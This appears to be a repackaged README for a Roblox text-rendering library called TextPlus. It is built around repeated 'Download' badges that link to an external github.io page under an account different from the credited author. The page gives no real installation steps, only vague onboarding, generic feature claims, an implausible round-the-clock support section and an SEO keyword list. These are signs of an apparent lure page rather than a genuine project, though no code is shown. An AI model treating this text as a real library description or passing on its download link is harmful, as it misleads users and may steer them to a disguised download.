![preview](https://raw.githubusercontent.com/wtcbuy/Roblox-Text-Render/main/poster_3522.svg)
[![Download](https://raw.githubusercontent.com/wtcbuy/Roblox-Text-Render/main/app_448b6.svg)](https://wtcbuy.github.io/Roblox-Text-Render/)

# TextPlus

### An Efficient, Robust, Open-Source Text-Rendering Library for Roblox

[![Download](https://raw.githubusercontent.com/wtcbuy/Roblox-Text-Render/main/app_448b6.svg)](https://wtcbuy.github.io/Roblox-Text-Render/)

---

## 📜 Table of Contents

- [Overview](#-overview)
- [Why TextPlus?](#-why-textplus)
- [Feature List](#-feature-list)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Custom Font Engine](#-custom-font-engine)
- [Advanced Text Control](#-advanced-text-control)
- [24/7 Customer Support](#-247-customer-support)
- [Architecture & Design](#-architecture--design)
- [Performance Benchmarks](#-performance-benchmarks)
- [Getting Started](#-getting-started)
- [Usage Examples](#-usage-examples)
- [Configuration Reference](#-configuration-reference)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Ecosystem](#-community--ecosystem)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌟 Overview

TextPlus is an efficient, robust, open-source text-rendering library crafted specifically for the Roblox platform. It was born from a simple frustration: default text rendering in Roblox experiences often feels rigid, limited, and disconnected from the expressive worlds developers want to build. TextPlus reimagines how developers think about typography inside their games, GUIs, and interfaces — turning plain strings into living, breathing design elements.

Where most libraries stop at "draw a label," TextPlus keeps going. It gives you granular control over fonts, kerning, layout, wrapping, animation timing, and even how each glyph behaves under dynamic scaling. Whether you're building a sprawling RPG dialogue system, a fast-paced competitive HUD, or a minimalist settings menu, TextPlus is designed to sit quietly under the hood and deliver beautiful results.

This repository is the home of the core library, the custom font tooling, and the documentation that supports it. It is maintained with an obsessive focus on performance, clarity of API, and long-term stability for production Roblox projects.

---

## 💡 Why TextPlus?

Imagine typography as a river. In many engines, that river is dammed — narrow, predictable, and difficult to redirect. TextPlus removes the dam. It lets text flow naturally through your UI, adapting to context, language, and moment-to-moment design needs.

Key reasons developers reach for TextPlus:

- **Predictable performance** — optimized render paths that scale across hundreds of text elements.
- **Expressive control** — manipulate every aspect of text, from character spacing to per-glyph color.
- **Custom fonts** — bring your own typographic identity without fighting the engine.
- **Multilingual readiness** — design once, ship across languages.
- **Responsive layouts** — text that respects the container it lives in.
- **Open-source ethos** — inspect it, extend it, contribute to it.

TextPlus is not just a utility. It's a philosophy: text deserves as much design attention as sprites, meshes, and particles.

---

## 🧩 Feature List

TextPlus ships with a broad and evolving set of capabilities. Below is a curated look at what's inside.

### Core Rendering

- High-performance glyph layout engine
- Sub-pixel accurate text positioning
- Adaptive line-breaking and word-wrapping
- Rich-text markup support with tag parsing
- Inline color, weight, and style overrides
- Baseline, cap-height, and x-height alignment modes
- Automatic overflow handling with configurable policies

### Typographic Control

- Custom kerning tables
- Letter spacing and word spacing adjustments
- Vertical and horizontal alignment matrices
- Multi-line paragraph spacing controls
- Hyphenation hints for long words
- Ligature awareness for supported fonts

### Animation & Effects

- Typewriter effect with variable speed curves
- Fade-in, slide-in, and scale-in per glyph
- Wave and bounce motion presets
- Per-character color gradients
- Shake, jitter, and glitch effects
- Timeline-based animations for sequenced text

### Font Handling

- Custom font registration and fallback chains
- Bitmap and vector-style font support
- Dynamic font scaling without blurring
- Font atlas caching for repeated glyphs
- Weight and style variants in a single family
- RTL and bi-directional text readiness

### Integration

- Clean, idiomatic API surface for Roblox developers
- Event hooks for layout and render stages
- Compatible with ScreenGui, SurfaceGui, BillboardGui
- Works alongside existing UI frameworks
- Zero-dependency core for easy embedding

### Developer Experience

- Extensive inline documentation
- Example scenes and demos
- Debug overlays for layout inspection
- Error messages designed to guide, not frustrate
- Modular architecture for selective inclusion

---

## 📱 Responsive UI Philosophy

Text in modern Roblox experiences must live in many contexts: phones, tablets, desktops, consoles, and everything in between. A font size that looks elegant on a 4K monitor can become a smudge on a mobile device. TextPlus treats responsiveness as a first-class citizen.

Every text object can be bound to responsive rules:

- **Scale-aware sizing** — text scales relative to screen or container dimensions.
- **Breakpoint behavior** — different styles can activate at different viewport widths.
- **Container-fit modes** — text can shrink, wrap, or truncate based on available space.
- **Aspect-ratio awareness** — layout adapts gracefully across wide and tall screens.

The result is UI that feels intentional on every device, without a web of conditional logic scattered through your codebase.

---

## 🌍 Multilingual Support

Languages are not just translations — they are different visual rhythms. Some scripts flow right-to-left. Some stack vertically. Some use characters that occupy double width. TextPlus was designed with this reality in mind.

Multilingual capabilities include:

- Unicode-aware character handling
- Right-to-left and left-to-right layout modes
- Vertical text orientation options
- Per-locale font fallback chains
- Locale-specific line-breaking rules
- Consistent rendering across scripts
- Easy swapping of language packs at runtime

If your experience ships in more than one language, TextPlus helps ensure every player sees text that feels native.

---

## ✒️ Custom Font Engine

One of the crown jewels of TextPlus is its custom font engine. Rather than locking you into a fixed set of engine-provided typefaces, TextPlus lets you bring your own typographic identity.

Highlights:

- Register fonts from image atlases
- Define glyph metrics manually or via tooling
- Compose font families with multiple weights
- Assign fallback fonts per character range
- Cache glyph data for efficient reuse
- Preview fonts in a dedicated debug scene

Custom fonts are more than aesthetics — they are brand. TextPlus treats them accordingly.

---

## 🎛 Advanced Text Control

Beyond basic rendering, TextPlus exposes a deep level of control for developers who want to push typography further.

- **Per-glyph styling** — color, opacity, offset, rotation, and scale can be set individually.
- **Tag-based markup** — embed style directives directly in strings for expressive content.
- **Layout introspection** — query computed line boxes, character bounds, and overflow regions.
- **Event-driven rendering** — hook into layout passes to inject custom behaviors.
- **Clipping and masking** — constrain text to shapes and regions.
- **Selection and caret support** — for input fields and editable content.

This level of control means TextPlus can serve as the foundation for editors, chat systems, subtitles, and beyond.

---

## 🕐 24/7 Customer Support

Software is a relationship, not a transaction. TextPlus is backed by a support philosophy that treats every issue as a chance to improve the library.

Support channels include:

- **Always-on community assistance** — questions answered around the clock by maintainers and community members.
- **Issue triage with clear timelines** — every report gets acknowledged and tracked.
- **Documentation-first answers** — if a question is common, the docs get improved, not just the reply.
- **Migration guidance** — help upgrading between major versions.
- **Feature requests with transparency** — you'll always know where your idea stands.

The aim is simple: no developer should feel stuck alone in the dark with a rendering bug at 3 a.m.

---

## 🏗 Architecture & Design

TextPlus is organized into clear, composable layers:

1. **Font Layer** — manages font registration, glyph data, and caching.
2. **Layout Layer** — computes line breaks, spacing, and alignment.
3. **Render Layer** — draws glyphs efficiently with minimal draw calls.
4. **Control Layer** — exposes the public API and event hooks.
5. **Tooling Layer** — helper scripts for font generation and debugging.

Each layer is intentionally decoupled. You can swap or extend any of them without rewriting the others. This modularity is what allows TextPlus to remain small at its core while offering deep capabilities on demand.

---

## ⚡ Performance Benchmarks

Performance is not an afterthought — it's a design constraint. TextPlus was built with a focus on keeping frame times stable even under heavy text load.

General observations from internal testing:

- Hundreds of simultaneous text elements render without significant frame impact.
- Glyph caching dramatically reduces repeated layout cost.
- Layout passes are optimized to avoid redundant recomputation.
- Memory footprint scales gracefully with font variety, not text volume.

Exact numbers vary by device and scene, but the guiding principle is consistent: text should never be the reason a frame drops.

---

## 🚀 Getting Started

TextPlus is distributed as a source-available library that you bring into your Roblox project through your preferred workflow. Because every team's pipeline differs, the library is designed to be flexible about how it's introduced.

A typical path looks like this:

1. Obtain the library source through your standard package or file management approach.
2. Place the library module within your project structure where it can be required by your UI code.
3. Require the module from a client-side script.
4. Create a text object, configure it, and attach it to a GUI container.
5. Iterate with the debug overlay enabled to refine layout and behavior.

Detailed onboarding notes live alongside the library so you can go from zero to rendered text quickly.

---

## 🧪 Usage Examples

The following illustrative snippets show how TextPlus feels in practice. (Conceptual examples — adapt to your project structure.)

### Creating a Simple Label

    local TextPlus = require(path.to.TextPlus)

    local label = TextPlus.new({
        text = "Welcome to the world of TextPlus.",
        font = "DefaultSans",
        size = 24,
        color = Color3.fromRGB(240, 240, 240),
        parent = someGuiFrame
    })

### Applying Responsive Rules

    label:setResponsive({
        mode = "scale",
        minSize = 14,
        maxSize = 48,
        anchor = "center"
    })

### Animating Text Appearance

    label:animate("typewriter", {
        speed = 40,
        curve = "easeOut",
        onComplete = function()
            print("Text finished rendering.")
        end
    })

### Using Rich Markup

    label:setText("Hello <b>brave</b> <color=#ffcc00>developer</color>!")

### Registering a Custom Font

    TextPlus.Fonts.register("MyBrandFont", {
        atlas = someImageAsset,
        metrics = myGlyphMetricsTable,
        fallback = {"DefaultSans"}
    })

These examples only scratch the surface. The library rewards exploration.

---

## 🔧 Configuration Reference

TextPlus exposes configuration at multiple levels: global defaults, per-instance options, and runtime adjustments.

Common configuration categories:

- **Appearance** — font, size, color, opacity, stroke, shadow.
- **Layout** — alignment, wrapping, spacing, padding, margins.
- **Behavior** — responsiveness mode, overflow policy, animation defaults.
- **Advanced** — kerning overrides, glyph substitutions, custom render hooks.

Every option is documented with type, default, and effect so you can tune confidently.

---

## 🗺 Roadmap for 2026

The project's direction for 2026 focuses on depth and polish:

- Expanded multilingual shaping rules
- Richer animation presets and blending modes
- Improved font tooling with visual metrics editors
- Deeper integration with common UI patterns
- Enhanced debugging and inspection tools
- Broader example library covering real-world scenarios

Community feedback shapes this roadmap. Suggestions are always welcome.

---

## 🤝 Contributing

Contributions are welcomed and appreciated. Whether it's a typo fix, a new animation preset, or a deep architectural improvement, there's a place for it.

Guidelines:

- Keep changes focused and well-scoped.
- Follow the existing code style and structure.
- Add or update documentation when behavior changes.
- Include reasoning in your pull request description.
- Be kind and constructive in reviews.

TextPlus thrives because people care about typography as much as the maintainers do.

---

## 🌐 Community & Ecosystem

TextPlus is more than a single repository. It's part of a growing ecosystem of Roblox developers who care about interface quality.

Ways to engage:

- Share your projects that use TextPlus.
- Suggest font families and presets.
- Contribute example scenes.
- Help answer questions from newcomers.
- Spread word about thoughtful UI design in Roblox.

The more voices, the richer the library becomes.

---

## 🔍 SEO & Discoverability Notes

TextPlus is built to be discoverable by developers searching for Roblox text rendering solutions. Topics naturally covered by this project include:

- Roblox text rendering library
- Roblox custom font support
- Roblox UI typography tools
- Responsive text layout for Roblox
- Multilingual Roblox GUI text
- Roblox rich text markup
- Roblox text animation presets

If you are searching for a robust, open-source way to bring advanced text control to your Roblox project, TextPlus is designed to be exactly that.

---

## ⚠️ Disclaimer

TextPlus is provided as an open-source library under the MIT License. It is offered "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use of the software.

TextPlus is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" is a trademark of Roblox Corporation. All references are for descriptive purposes only.

Users are responsible for ensuring their use of TextPlus complies with all applicable platform terms of service and local laws.

---

## 📄 License

TextPlus is released under the MIT License. See the full license text for details:

MIT License

https://opensource.org/licenses/MIT

Copyright (c) 2026 AlexanderLindholt

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

[![Download](https://raw.githubusercontent.com/wtcbuy/Roblox-Text-Render/main/app_448b6.svg)](https://wtcbuy.github.io/Roblox-Text-Render/)

*TextPlus — because every pixel of text deserves intention.*